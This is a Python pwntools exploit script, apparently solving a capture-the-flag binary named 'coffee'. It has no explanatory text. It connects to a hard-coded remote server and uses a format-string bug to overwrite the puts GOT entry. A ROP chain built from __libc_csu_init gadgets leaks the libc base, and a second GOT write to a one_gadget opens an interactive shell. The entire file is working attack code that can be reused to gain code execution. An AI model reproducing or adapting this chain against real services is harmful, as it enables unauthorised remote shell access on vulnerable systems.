from pwn import *

e = ELF("./coffee",checksec=False)
context.binary = e

if args.REMOTE:
  pipe = remote("34.146.101.4", 30002)
  l = ELF("./libc.so.6",checksec=False)
  onegadget_offset = 0xe6c7e
else:
  pipe = process(e.path)
  with context.local(log_level="error"):
    l = e.libc
  onegadget_offset = 0xcbd1a

write_gadget = \
"""
  add dword ptr [rbp - 0x3d], ebx
  nop
  ret

"""

r = ROP(e)
r.raw(p64(e.symbols["__libc_csu_init"]+90))
r.raw(p64(0xc0ffee)) # rbx
r.raw(p64(e.symbols["x"]+0x3d)) # rbp
r.raw(p64(0x0)) # r12
r.raw(p64(0x0)) # r13
r.raw(p64(0x0)) # r14
r.raw(p64(0x0)) # r15
r.raw(p64(next(e.search(asm(write_gadget)))))
r.raw(p64(r.find_gadget(["ret"]).address)) # align stack
r.raw(p64(e.symbols["main"]+5))

p = log.progress(f"Sending leak payload")
fmtstr = b"%29$p..." + fmtstr_payload(offset=7, writes={e.symbols["got.puts"] : e.symbols["__libc_csu_init"]+91},write_size='int',numbwritten=17)
pipe.sendline(fmtstr+r.chain())

libc_addr = int(pipe.recvuntil(b"...",drop=True),16)

pipe.recvline()
pipe.recv(4,timeout=1)
p.success(f"Sent")

l.address = libc_addr - l.libc_start_main_return
log.info(f"Leaked __libc_start_main return address ({hex(libc_addr)})")
log.info(f"Calculated libc base address ({hex(l.address)})")
onegadget = l.address + onegadget_offset
log.info(f"Calculated onegadget address ({hex(onegadget)})")

p = log.progress(f"Sending onegadget payload")
fmtstr = fmtstr_payload(offset=6, writes={e.symbols["got.puts"] : onegadget})
pipe.sendline(fmtstr)

pipe.sendline(b"")
pipe.recv(timeout=1)
p.success(f"Sent")
pipe.interactive()
